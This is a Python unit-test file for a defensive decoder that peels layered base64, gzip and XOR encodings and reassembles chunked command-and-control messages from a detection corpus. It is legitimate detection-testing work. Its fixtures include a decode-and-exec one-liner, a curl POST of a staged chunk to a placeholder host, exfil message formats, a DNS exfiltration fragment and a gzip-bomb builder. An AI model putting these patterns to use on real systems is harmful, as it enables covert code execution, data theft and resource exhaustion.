#!/usr/bin/env python3
"""Tests for decode_correlate.py (#154 phase 2, first half).

Two groups:

1. Unit tests against hand-built fixtures -- prove bounded_decode/
   extract_candidate_blob/ChunkCorrelator each work in isolation, including
   their bounds/failure modes (depth cap, size cap, malformed input never
   raising, incomplete chunk sets never decoding).
2. End-to-end tests against corpus.jsonl itself -- prove the module
   actually recovers what each encoded corpus event's own
   expected_findings.decoded_summary claims, not just that it works on
   fixtures built specifically to exercise it. This is the corpus's own
   "ground truth" contract (see its README) being cashed in for real.
"""
import base64
import gzip
import json
import sys
import unittest
import zlib
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import decode_correlate as dc  # noqa: E402
import validate_corpus  # noqa: E402


class TestBoundedDecode(unittest.TestCase):
    def test_plain_base64_gzip(self):
        payload = b"hello from a test"
        blob = base64.b64encode(gzip.compress(payload))
        result = dc.bounded_decode(blob)
        self.assertTrue(result.ok)
        self.assertEqual(result.output, payload)
        self.assertEqual([s.transform for s in result.chain], ["base64", "gzip"])

    def test_plain_base64_zlib(self):
        payload = b"zlib flavored payload"
        blob = base64.b64encode(zlib.compress(payload))
        result = dc.bounded_decode(blob)
        self.assertTrue(result.ok)
        self.assertEqual(result.output, payload)

    def test_double_base64(self):
        # A space guarantees this can never itself look like valid base64
        # (in either the standard or URL-safe alphabet _try_base64 tries),
        # so the loop is guaranteed to stop here rather than attempting a
        # spurious third decode. "double-wrapped" (no space) was the
        # original fixture here and is a real, instructive miss: its
        # hyphen collides with the URL-safe alphabet's '-'->'+' mapping,
        # so it happens to *also* look like valid (if garbage) base64 --
        # bounded_decode correctly keeps trying and returns a 3rd-layer
        # decode of noise, which is genuinely correct behavior for that
        # input, not a bug this fixture should paper over.
        payload = b"double wrapped payload"
        blob = base64.b64encode(base64.b64encode(payload))
        result = dc.bounded_decode(blob)
        self.assertTrue(result.ok)
        self.assertEqual(result.output, payload)
        self.assertEqual([s.transform for s in result.chain], ["base64", "base64"])

    def test_xor_then_gzip(self):
        payload = b"xor obfuscated dropper stage"
        key = 0x7F
        compressed = gzip.compress(payload)
        xored = bytes(b ^ key for b in compressed)
        blob = base64.b64encode(xored)
        result = dc.bounded_decode(blob)
        self.assertTrue(result.ok)
        self.assertEqual(result.output, payload)
        self.assertEqual(result.chain[-1].transform, f"xor:0x{key:02x}+gzip")

    def test_key_zero_is_tried(self):
        # 0x00 is a valid (if pointless) XOR key -- range(256) must include it.
        payload = b"key zero edge case"
        compressed = gzip.compress(payload)
        blob = base64.b64encode(bytes(b ^ 0x00 for b in compressed))
        result = dc.bounded_decode(blob)
        self.assertTrue(result.ok)
        self.assertEqual(result.output, payload)

    def test_plain_text_with_no_encoding_fails_cleanly(self):
        result = dc.bounded_decode(b"just an ordinary shell command, id; whoami")
        self.assertFalse(result.ok)
        self.assertIn("no base64", result.reason)

    def test_garbage_bytes_never_raise(self):
        # #154's own safety posture: a parser a hostile input can crash is
        # itself a finding. Feeds genuinely random/adversarial bytes,
        # confirms bounded_decode degrades to ok=False instead of throwing.
        garbage_samples = [
            b"\x00\x01\x02\xff\xfe\xfd" * 20,
            b"====",
            b"A" * 5,
            b"",
            bytes(range(256)),
        ]
        for sample in garbage_samples:
            result = dc.bounded_decode(sample)
            self.assertIsInstance(result, dc.DecodeResult)

    def test_output_size_cap_enforced(self):
        # A base64 blob that decodes to something already past max_output
        # should stop there, not silently return the oversized data.
        huge = b"A" * 200
        blob = base64.b64encode(huge)
        result = dc.bounded_decode(blob, max_output=100)
        self.assertFalse(result.ok)
        self.assertTrue(result.truncated)

    def test_depth_cap_enforced(self):
        # Six layers of base64 with a max_depth of 3 should stop at 3,
        # leaving output not equal to the fully-decoded plaintext.
        payload = b"deeply nested"
        blob = payload
        for _ in range(6):
            blob = base64.b64encode(blob)
        result = dc.bounded_decode(blob, max_depth=3)
        self.assertTrue(result.ok)
        self.assertEqual(len(result.chain), 3)
        self.assertNotEqual(result.output, payload)

    def test_provenance_hashes_are_real_sha256(self):
        payload = b"provenance check"
        blob = base64.b64encode(gzip.compress(payload))
        result = dc.bounded_decode(blob)
        import hashlib
        self.assertEqual(result.chain[0].input_sha256, hashlib.sha256(blob).hexdigest())
        self.assertEqual(result.chain[-1].output_sha256, hashlib.sha256(payload).hexdigest())


def _gzip_bomb(expansion_bytes: int) -> bytes:
    """Builds a real high-ratio gzip member without ever holding its
    expansion in memory -- compressobj streams the zeros in."""
    comp = zlib.compressobj(9, zlib.DEFLATED, 31)  # 31 = gzip framing
    blob = bytearray()
    zeros = b"\0" * (1024 * 1024)
    for _ in range(expansion_bytes // len(zeros)):
        blob += comp.compress(zeros)
    blob += comp.flush()
    return bytes(blob)


class TestBoundedDecompressionMemory(unittest.TestCase):
    """#2088: the decompress paths must enforce max_output DURING
    inflation -- the old post-hoc check only ran after
    gzip.decompress/zlib.decompress had allocated the entire expansion,
    so a ~200KB bomb expanded past 10 GiB before being rejected. These
    tests bound tracemalloc's peak during the decode: the expansion never
    exists, on all three paths."""

    EXPANSION = 320 * 1024 * 1024

    def _peak_during_decode(self, blob: bytes):
        import tracemalloc
        tracemalloc.start()
        try:
            result = dc.bounded_decode(blob)
            _, peak = tracemalloc.get_traced_memory()
        finally:
            tracemalloc.stop()
        return result, peak

    def _assert_rejected_bounded(self, result, peak, expected_reason):
        self.assertFalse(result.ok)
        self.assertTrue(result.truncated)
        self.assertEqual(result.reason, expected_reason)
        # Cap is 10 MiB; allow the working-set noise (chunk buffer +
        # bytearray growth + the final copy) an order of magnitude below
        # the 320 MiB expansion this input would have materialized under
        # the old decompress-then-check order.
        self.assertLess(peak, 32 * 1024 * 1024)

    def test_gzip_bomb_is_rejected_without_materializing_expansion(self):
        bomb = _gzip_bomb(self.EXPANSION)
        self.assertLess(len(bomb), 1024 * 1024, "sanity: the compressed input is tiny")
        result, peak = self._peak_during_decode(bomb)
        self._assert_rejected_bounded(result, peak, "gzip output exceeds max_output")

    def test_zlib_bomb_shares_the_bounded_path(self):
        comp = zlib.compressobj(9)
        blob = bytearray()
        zeros = b"\0" * (1024 * 1024)
        for _ in range(self.EXPANSION // len(zeros)):
            blob += comp.compress(zeros)
        blob += comp.flush()
        result, peak = self._peak_during_decode(bytes(blob))
        self._assert_rejected_bounded(result, peak, "zlib output exceeds max_output")

    def test_xor_obfuscated_gzip_bomb_shares_the_bounded_path(self):
        key = 0x37
        bomb = _gzip_bomb(self.EXPANSION)
        xored = bytes(b ^ key for b in bomb)
        result, peak = self._peak_during_decode(xored)
        self._assert_rejected_bounded(result, peak, "xor+gzip output exceeds max_output")


class TestDecompressionFramingParity(unittest.TestCase):
    """#2088 moved gzip/zlib handling onto zlib.decompressobj; these pin
    the framing behaviors the old gzip.decompress/zlib.decompress calls
    provided, which callers may implicitly rely on."""

    def test_concatenated_gzip_members_still_concatenate_output(self):
        a, b = b"first member", b"second member"
        blob = base64.b64encode(gzip.compress(a) + gzip.compress(b))
        result = dc.bounded_decode(blob)
        self.assertTrue(result.ok)
        self.assertEqual(result.output, a + b)

    def test_trailing_non_gzip_bytes_after_a_member_fail_cleanly(self):
        blob = gzip.compress(b"hello") + b"junk"
        result = dc.bounded_decode(blob)
        self.assertIsInstance(result, dc.DecodeResult)
        self.assertFalse(result.ok, "gzip's own BadGzipFile on trailing junk maps to 'not gzip', not a crash")

    def test_zlib_stream_with_trailing_bytes_still_decodes(self):
        # Payload deliberately isn't pure base64 alphabet (the space), so
        # bounded_decode's iterative peeling stops at this layer instead of
        # "decoding" it further -- that behavior is pre-existing and
        # unchanged; what's under test here is only the ignored tail.
        payload = b"real final layer with spaces"
        blob = base64.b64encode(zlib.compress(payload) + b"ignored-tail")
        result = dc.bounded_decode(blob)
        self.assertTrue(result.ok)
        self.assertEqual(result.output, payload)


class TestExtractCandidateBlob(unittest.TestCase):
    def test_extracts_data_field(self):
        text = "type=exfil&channel=c9f2&seq=1&chk=b12e&data=SGVsbG8="
        self.assertEqual(dc.extract_candidate_blob(text), "SGVsbG8=")

    def test_extracts_python_literal(self):
        text = "python3 -c \"exec(gzip.decompress(base64.b64decode('SGVsbG8=')))\""
        self.assertEqual(dc.extract_candidate_blob(text), "SGVsbG8=")

    def test_falls_back_to_longest_bare_run(self):
        text = "some noise ab short then a longer run QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo= end"
        result = dc.extract_candidate_blob(text)
        self.assertEqual(result, "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=")

    def test_returns_none_for_ordinary_command(self):
        self.assertIsNone(dc.extract_candidate_blob("id; whoami; uname -a"))


class TestChunkCorrelator(unittest.TestCase):
    def test_reassembles_two_parts(self):
        c = dc.ChunkCorrelator()
        c.add(dc.ChunkMessage("stage", "abcd", 1, "AAAA"))
        c.add(dc.ChunkMessage("stage", "abcd", 2, "BBBB"))
        key = ("stage", "abcd")
        self.assertTrue(c.is_complete(key))
        self.assertEqual(c.reassembled_bytes(key), b"AAAABBBB")

    def test_incomplete_with_gap_never_reassembles(self):
        c = dc.ChunkCorrelator()
        c.add(dc.ChunkMessage("stage", "abcd", 1, "AAAA"))
        c.add(dc.ChunkMessage("stage", "abcd", 3, "CCCC"))  # seq=2 missing
        key = ("stage", "abcd")
        self.assertFalse(c.is_complete(key))
        self.assertIsNone(c.reassembled_bytes(key))

    def test_same_channel_different_type_stays_separate(self):
        # The exact scenario corpus-015/016 (type=stage) vs corpus-017
        # (type=exfil) exercises for real below -- same channel ID, must
        # not merge.
        c = dc.ChunkCorrelator()
        c.add(dc.ChunkMessage("stage", "c9f2", 1, "AAAA"))
        c.add(dc.ChunkMessage("exfil", "c9f2", 1, "ZZZZ"))
        self.assertEqual(c.reassembled_bytes(("stage", "c9f2")), b"AAAA")
        self.assertEqual(c.reassembled_bytes(("exfil", "c9f2")), b"ZZZZ")

    def test_out_of_order_insertion_still_reassembles_in_sequence_order(self):
        c = dc.ChunkCorrelator()
        c.add(dc.ChunkMessage("stage", "abcd", 2, "BBBB"))
        c.add(dc.ChunkMessage("stage", "abcd", 1, "AAAA"))
        self.assertEqual(c.reassembled_bytes(("stage", "abcd")), b"AAAABBBB")


class TestParseChunkMessage(unittest.TestCase):
    def test_parses_full_message(self):
        # _DATA_FIELD_RE requires >=8 chars precisely so a short, unrelated
        # word after "data=" in some other context doesn't get mistaken
        # for a payload -- "AAAAAAAA" here, not a 4-char stand-in, so this
        # test exercises the real minimum rather than tripping over it.
        text = "curl -s -X POST http://example/capture -d 'type=stage&channel=c9f2&seq=1&chk=a91f&data=AAAAAAAA'"
        msg = dc.parse_chunk_message(text)
        self.assertIsNotNone(msg)
        self.assertEqual(msg.msg_type, "stage")
        self.assertEqual(msg.channel, "c9f2")
        self.assertEqual(msg.seq, 1)
        self.assertEqual(msg.checksum, "a91f")
        self.assertEqual(msg.data, "AAAAAAAA")

    def test_returns_none_for_single_shot_command(self):
        text = "python3 -c \"exec(gzip.decompress(base64.b64decode('SGVsbG8=')))\""
        self.assertIsNone(dc.parse_chunk_message(text))

    def test_returns_none_for_ordinary_command(self):
        self.assertIsNone(dc.parse_chunk_message("id; whoami"))


class TestAgainstRealCorpus(unittest.TestCase):
    """The corpus's own README/schema.json describe expected_findings as
    ground truth for phase 2. This proves that contract, event by event,
    against the actual module rather than trusting the corpus's own prose."""

    @classmethod
    def setUpClass(cls):
        cls.events = validate_corpus.load_corpus()
        cls.by_id = {e["event_id"]: e for e in cls.events}

    def test_corpus_013_single_shot_gzip_base64(self):
        e = self.by_id["corpus-013"]
        blob = dc.extract_candidate_blob(e["raw"]["input"])
        self.assertIsNotNone(blob)
        result = dc.bounded_decode(blob.encode())
        self.assertTrue(result.ok)
        self.assertEqual(result.output, b"echo corpus-marker-1")
        self.assertIn(result.output.decode(), e["expected_findings"]["decoded_summary"])

    def test_corpus_015_016_chunked_xor_gzip_reassembly(self):
        e15 = self.by_id["corpus-015"]
        e16 = self.by_id["corpus-016"]
        msg1 = dc.parse_chunk_message(e15["raw"]["input"])
        msg2 = dc.parse_chunk_message(e16["raw"]["input"])
        self.assertIsNotNone(msg1)
        self.assertIsNotNone(msg2)
        self.assertEqual(msg1.key, msg2.key)  # same (type, channel)

        correlator = dc.ChunkCorrelator()
        correlator.add(msg1)
        # A single chunk alone must not be decodable -- the real proof of
        # that (per ChunkCorrelator's own documented is_complete()
        # limitation: "1 chunk, no gaps" is structurally indistinguishable
        # from a genuine 1-chunk message) is a failed bounded_decode of
        # that chunk's data alone, not is_complete() itself.
        lone_chunk_result = dc.bounded_decode(msg1.data.encode())
        self.assertFalse(lone_chunk_result.ok)
        correlator.add(msg2)
        self.assertTrue(correlator.is_complete(msg1.key))

        reassembled = correlator.reassembled_bytes(msg1.key)
        self.assertIsNotNone(reassembled)
        result = dc.bounded_decode(reassembled)
        self.assertTrue(result.ok)
        self.assertEqual(result.output, b"echo corpus-marker-2")
        self.assertTrue(result.chain[-1].transform.startswith("xor:0x5a"))

    def test_corpus_017_exfil_caller_identity_document(self):
        e = self.by_id["corpus-017"]
        blob = dc.extract_candidate_blob(e["raw"]["payload_printable"])
        self.assertIsNotNone(blob)
        result = dc.bounded_decode(blob.encode())
        self.assertTrue(result.ok)
        doc = json.loads(result.output)
        self.assertEqual(doc["account_id"], "999999999999")
        self.assertIn("assumed-role/corpus-fake-role", doc["arn"])

    def test_corpus_018_dns_label_is_a_fragment_of_corpus_017s_payload(self):
        e17 = self.by_id["corpus-017"]
        e18 = self.by_id["corpus-018"]
        label = e18["raw"]["dns"]["rrname"].split(".")[0]
        padded = label.upper() + "=" * ((8 - len(label) % 8) % 8)
        fragment = base64.b32decode(padded)

        full_blob = dc.extract_candidate_blob(e17["raw"]["payload_printable"])
        full_doc = dc.bounded_decode(full_blob.encode()).output
        self.assertTrue(
            full_doc.startswith(fragment),
            "corpus-018's DNS fragment should be a prefix of corpus-017's full decoded document",
        )

    def test_corpus_015_017_channel_reuse_is_visible_across_types(self):
        # The cross-phase correlation signal both events' own notes claim:
        # same channel ID, different message type, same actor -- this is
        # what phase 3's criticality rules would key on, not decoding
        # itself. Confirms the signal is actually there to key on.
        e15 = self.by_id["corpus-015"]
        e17 = self.by_id["corpus-017"]
        msg15 = dc.parse_chunk_message(e15["raw"]["input"])
        msg17_text = e17["raw"]["payload_printable"]
        self.assertIn(f"channel={msg15.channel}", msg17_text)


if __name__ == "__main__":
    unittest.main()
